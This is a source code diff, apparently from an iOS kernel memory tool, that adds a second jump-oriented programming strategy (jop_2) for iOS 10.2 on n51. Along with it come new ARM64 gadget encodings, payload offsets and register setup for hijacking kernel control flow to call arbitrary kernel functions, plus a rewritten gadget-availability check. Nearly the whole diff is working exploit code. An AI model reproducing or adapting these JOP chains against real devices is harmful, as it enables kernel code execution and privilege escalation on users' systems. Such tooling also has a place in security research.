@@ -10,17 +10,20 @@
  * We use a JOP payload rather than a ROP payload in order to preserve the kernel stack,
  * simplifying cleanup and making the program more modular.
  *
- * Currently the gadgets are all hardcoded from the iOS 10.1.1 14B100 kernelcache on n71 and d10.
- * As such, there is no guarantee that the required gadgets will be available on other builds or
- * platforms. In the future, I hope to implement a system of disassembling the kernelcache to look
- * for suitable gadgets from which to build a JOP function call payload, or even create a framework
- * to perform arbitrary computation within a JOP payload.
+ * Currently the gadgets are hardcoded from specific iOS builds (for example, from the iOS 10.1.1
+ * 14B100 kernelcache on n71). As such, there is no guarantee that the required gadgets will be
+ * available on other builds or platforms. In the future, I hope to implement a system of
+ * disassembling the kernelcache to look for suitable gadgets from which to build a JOP function
+ * call payload, or even create a framework to perform arbitrary computation within a JOP payload.
+ *
+ * The specific JOP strategy used depends on the set of gadgets available on the target. Below, I
+ * document the first strategy, implemented in jop_1.
  *
  * The JOP payload is set up by writing the JOP stack (called JOP_STACK) and the value stack
  * (called VALUE_STACK) into kernel memory. Then kernel_call_7 is used to initialize registers and
  * jump to the first gadget, which sets up the necessary context to start executing from JOP_STACK.
  *
- * The most important JOP gadget is the dispatcher. Currently, I am using this incredibly useful
+ * The most important JOP gadget is the dispatcher. For jop_1, I am using this incredibly useful
  * gadget from com.apple.filesystems.apfs:
  *
  * 	ldp     x2, x1, [x1]
@@ -407,7 +410,16 @@ struct gadget gadgets[] = {
 	                                        0xf9000280, 0xf94002c8, 0xf9401508, 0xaa1603e0,
 	                                        0xd63f0100),
 	GADGET("mov x30, x21 ; br x8",          0xaa1503fe, 0xd61f0100),
-	GADGET("ret",                           0xd65f03c0)
+	GADGET("ret",                           0xd65f03c0),
+	GADGET("mov x28, x2 ; blr x8",          0xaa0203fc, 0xd63f0100),
+	GADGET("mov x21, x5 ; blr x8",          0xaa0503f5, 0xd63f0100),
+	GADGET("mov x15, x5 ; br x11",          0xaa0503ef, 0xd61f0160),
+	GADGET("mov x17, x15 ; br x8",          0xaa0f03f1, 0xd61f0100),
+	GADGET("mov x30, x22 ; br x17",         0xaa1603fe, 0xd61f0220),
+	GADGET("str x0, [x20] ; ldr x8, [x21] ; ldr x8, [x8, #0x28] ; mov x0, x21 ; blr x8",
+	                                        0xf9000280, 0xf94002a8, 0xf9401508, 0xaa1503e0,
+	                                        0xd63f0100),
+	GADGET("mov x30, x28 ; br x8",          0xaa1c03fe, 0xd61f0100),
 };
 #undef GADGET
 
@@ -439,6 +451,13 @@ enum {
 	STR_X0_X20__LDR_X8_X22__LDR_X8_X8_28__MOV_X0_X22__BLR_X8,
 	MOV_X30_X21__BR_X8,
 	RET,
+	MOV_X28_X2__BLR_X8,
+	MOV_X21_X5__BLR_X8,
+	MOV_X15_X5__BR_X11,
+	MOV_X17_X15__BR_X8,
+	MOV_X30_X22__BR_X17,
+	STR_X0_X20__LDR_X8_X21__LDR_X8_X8_28__MOV_X0_X21__BLR_X8,
+	MOV_X30_X28__BR_X8,
 	GADGET_COUNT
 };
 
@@ -551,6 +570,7 @@ struct strategy {
 };
 
 static void jop_1(uint64_t, const uint64_t[8], void *, struct initial_state *, uint64_t *);
+static void jop_2(uint64_t, const uint64_t[8], void *, struct initial_state *, uint64_t *);
 
 /*
  * strategies
@@ -559,7 +579,8 @@ static void jop_1(uint64_t, const uint64_t[8], void *, struct initial_state *, u
  * 	A list of all available strategies.
  */
 const struct strategy strategies[] = {
-	{ { 0x03ffffff }, 0x400, jop_1 },
+	{ { 0x0000000003ffffff }, 0x400, jop_1 },
+	{ { 0x00000001ff5fbfff }, 0x400, jop_2 },
 };
 
 /*
@@ -575,6 +596,9 @@ const struct strategy *strategy;
  *
  * Description:
  * 	Build the JOP payload described at the top of this file.
+ *
+ * Platforms:
+ * 	iOS 10.1.1 14B100: n71, d10
  */
 static void
 jop_1(uint64_t func, const uint64_t args[8],
@@ -658,7 +682,6 @@ jop_1(uint64_t func, const uint64_t args[8],
 	load_gadget->x3 = func;
 	load_gadget->x5 = args[7];
 	load_gadget = (struct load_gadget *)((uint8_t *)load_gadget + LOAD_ADVANCE);
-	load_gadget->x3 = func;
 	load_gadget->x3 = args[1];
 	load_gadget->x4 = args[2];
 	load_gadget->x5 = args[0];
@@ -687,6 +710,124 @@ jop_1(uint64_t func, const uint64_t args[8],
 }
 
 /*
+ * jop_2
+ *
+ * Description:
+ * 	An alternative JOP payload.
+ *
+ * Platforms:
+ * 	iOS 10.2 14C92: n51
+ */
+static void
+jop_2(uint64_t func, const uint64_t args[8],
+		void *payload0, struct initial_state *initial_state, uint64_t *result_address) {
+	const size_t VALUE_STACK_OFFSET  = 0;
+	const size_t RESULT_OFFSET       = 0x9c;
+	const size_t STORE_RESUME_OFFSET = 0;
+	const size_t JOP_STACK_OFFSET    = 0xe0;
+	const size_t LOAD_ADVANCE        = 0x34;
+	const int    STORE_RESUME_DELTA  = -0x28;
+
+	uint8_t *const payload = (uint8_t *)payload0;
+	// Set up STORE_RESUME.
+	uint64_t store_resume = jop_payload + STORE_RESUME_OFFSET;
+	uint64_t *store_resume_payload = (uint64_t *)(payload + STORE_RESUME_OFFSET);
+	store_resume_payload[0] = store_resume + sizeof(uint64_t) + STORE_RESUME_DELTA;
+	store_resume_payload[1] = gadgets[LDP_X2_X1_X1__BR_X2].address;
+	// Set up JOP_STACK.
+	const unsigned jop_call_chain_gadgets[] = {
+		MOV_X20_X0__BLR_X8,
+		MOV_X10_X4__BR_X8,
+		MOV_X9_X10__BR_X8,
+		MOV_X11_X9__BR_X8,
+		LDP_X3_X4_X20_20__LDP_X5_X6_X20_30__BLR_X8,
+		ADD_X20_X20_34__BR_X8,
+		MOV_X21_X5__BLR_X8,
+		MOV_X22_X6__BLR_X8,
+		MOV_X24_X4__BR_X8,
+		LDP_X3_X4_X20_20__LDP_X5_X6_X20_30__BLR_X8,
+		ADD_X20_X20_34__BR_X8,
+		MOV_X15_X5__BR_X11,
+		MOV_X17_X15__BR_X8,
+		MOV_X0_X3__BLR_X8,
+		MOV_X9_X0__BR_X11,
+		MOV_X7_X9__BLR_X11,
+		LDP_X3_X4_X20_20__LDP_X5_X6_X20_30__BLR_X8,
+		ADD_X20_X20_34__BR_X8,
+		MOV_X0_X3__BLR_X8,
+		MOV_X9_X0__BR_X11,
+		MOV_X10_X4__BR_X8,
+		MOV_X0_X5__BLR_X8,
+		LDP_X3_X4_X20_20__LDP_X5_X6_X20_30__BLR_X8,
+		MOV_X11_X24__BR_X8,
+		MOV_X1_X9__MOV_X2_X10__BLR_X11,
+	};
+	const unsigned jop_return_chain_gadgets[] = {
+		STR_X0_X20__LDR_X8_X21__LDR_X8_X8_28__MOV_X0_X21__BLR_X8,
+		MOV_X30_X28__BR_X8,
+		RET,
+	};
+	struct dispatch_gadget {
+		uint64_t x2;
+		uint64_t x1;
+	} *dispatch_gadget = (struct dispatch_gadget *)(payload + JOP_STACK_OFFSET);
+	uint64_t jop_chain_next = jop_payload + JOP_STACK_OFFSET;
+	for (size_t i = 0; i < ARRSIZE(jop_call_chain_gadgets); i++) {
+		jop_chain_next += sizeof(*dispatch_gadget);
+		dispatch_gadget->x2 = gadgets[jop_call_chain_gadgets[i]].address;
+		dispatch_gadget->x1 = jop_chain_next;
+		dispatch_gadget++;
+	}
+	uint64_t jop_return_chain = jop_chain_next;
+	for (size_t i = 0; i < ARRSIZE(jop_return_chain_gadgets); i++) {
+		jop_chain_next += sizeof(*dispatch_gadget);
+		dispatch_gadget->x2 = gadgets[jop_return_chain_gadgets[i]].address;
+		dispatch_gadget->x1 = jop_chain_next;
+		dispatch_gadget++;
+	}
+	// Set up VALUE_STACK.
+	struct load_gadget {
+		uint64_t pad[4];
+		uint64_t x3;
+		uint64_t x4;
+		uint64_t x5;
+		uint64_t x6;
+	} *load_gadget = (struct load_gadget *)(payload + VALUE_STACK_OFFSET);
+	load_gadget->x4 = gadgets[MOV_X30_X22__BR_X17].address;
+	load_gadget->x5 = store_resume;
+	load_gadget->x6 = gadgets[LDP_X8_X1_X20_10__BLR_X8].address;
+	load_gadget = (struct load_gadget *)((uint8_t *)load_gadget + LOAD_ADVANCE);
+	load_gadget->x3 = args[7];
+	load_gadget->x5 = func;
+	load_gadget = (struct load_gadget *)((uint8_t *)load_gadget + LOAD_ADVANCE);
+	load_gadget->x3 = args[1];
+	load_gadget->x4 = args[2];
+	load_gadget->x5 = args[0];
+	load_gadget = (struct load_gadget *)((uint8_t *)load_gadget + LOAD_ADVANCE);
+	load_gadget->x3 = args[3];
+	load_gadget->x4 = args[4];
+	load_gadget->x5 = args[5];
+	load_gadget->x6 = args[6];
+	struct call_recover_gadget {
+		uint64_t pad[2];
+		uint64_t x8;
+		uint64_t x1;
+	} *call_recover_gadget = (struct call_recover_gadget *)((uint8_t *)load_gadget);
+	call_recover_gadget->x8 = gadgets[LDP_X2_X1_X1__BR_X2].address;
+	call_recover_gadget->x1 = jop_return_chain;
+	// Declare the initial state.
+	initial_state->pc = gadgets[MOV_X12_X2__BR_X3].address;
+	initial_state->x[0] = jop_payload + VALUE_STACK_OFFSET,
+	initial_state->x[1] = jop_payload + JOP_STACK_OFFSET,
+	initial_state->x[2] = gadgets[MOV_X8_X4__BR_X5].address,
+	initial_state->x[3] = gadgets[MOV_X2_X30__BR_X12].address,
+	initial_state->x[4] = gadgets[LDP_X2_X1_X1__BR_X2].address,
+	initial_state->x[5] = gadgets[MOV_X28_X2__BLR_X8].address,
+	// Specify the result address.
+	*result_address = jop_payload + RESULT_OFFSET;
+}
+
+/*
  * choose_strategy
  *
  * Description:
@@ -694,19 +835,28 @@ jop_1(uint64_t func, const uint64_t args[8],
  */
 static bool
 choose_strategy() {
+	// Build a mask of the available gadgets.
+	uint64_t available[ARRSIZE(strategy->gadgets)] = { 0 };
+	for (unsigned g = 0; g < GADGET_COUNT; g++) {
+		unsigned block = g / (8 * sizeof(*strategy->gadgets));
+		unsigned bit   = g % (8 * sizeof(*strategy->gadgets));
+		if (gadgets[g].address != 0) {
+			available[block] |= 1 << bit;
+		} else {
+			memctl_warning("gadget '%s' is missing", gadgets[g].str);
+		}
+	}
+	// Test each strategy to see if all gadgets are present.
 	for (strategy = &strategies[0]; strategy < strategies + ARRSIZE(strategies); strategy++) {
-		for (unsigned g = 0; g < GADGET_COUNT; g++) {
-			unsigned block = g % (8 * sizeof(*strategy->gadgets));
-			unsigned bit   = g & (8 * sizeof(*strategy->gadgets) - 1);
-			if (gadgets[g].address == 0 && testbit(strategy->gadgets[block], bit)) {
-				// This gadget is missing.
+		for (unsigned b = 0; b < ARRSIZE(strategy->gadgets); b++) {
+			if ((available[b] & strategy->gadgets[b]) != strategy->gadgets[b]) {
 				goto next;
 			}
 		}
-		// All gadgets were found!
 		return true;
 next:;
 	}
+	strategy = NULL;
 	error_functionality_unavailable("kernel_call_aarch64: no available JOP strategy "
 	                                "for the gadgets present in this kernel");
 	return false;
